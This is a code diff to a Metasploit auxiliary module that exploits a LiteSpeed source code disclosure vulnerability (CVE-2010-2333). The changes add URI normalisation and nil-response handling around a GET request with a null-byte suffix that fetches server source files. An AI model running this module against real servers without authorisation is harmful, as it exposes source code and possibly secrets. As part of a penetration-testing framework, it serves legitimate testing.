@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -24,7 +20,6 @@ class Metasploit3 < Msf::Auxiliary
 					This module exploits a source code disclosure/download vulnerability in
 				versions 4.0.14 and prior of LiteSpeed.
 			},
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					[ 'CVE', '2010-2333' ],
@@ -47,11 +42,12 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
+		uri = normalize_uri(datastore['URI'])
 		"http://#{vhost}:#{rport}#{datastore['URI']}"
 	end
 
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = normalize_uri(datastore['URI'])
 		path_save = datastore['PATH_SAVE']
 
 		vuln_versions = [
@@ -63,10 +59,15 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			res = send_request_raw({
 				'method'  => 'GET',
-				'uri'     => "/#{uri}#{nullbytetxt}",
+				'uri'     => "#{uri}#{nullbytetxt}",
 			}, 25)
 
-			version = res.headers['Server'] if res
+			if res.nil?
+				print_error("#{target_url} - Connection timed out")
+				return
+			end
+
+			version = res.headers['Server']
 
 			if vuln_versions.include?(version)
 				print_good("#{target_url} - LiteSpeed - Vulnerable version: #{version}")
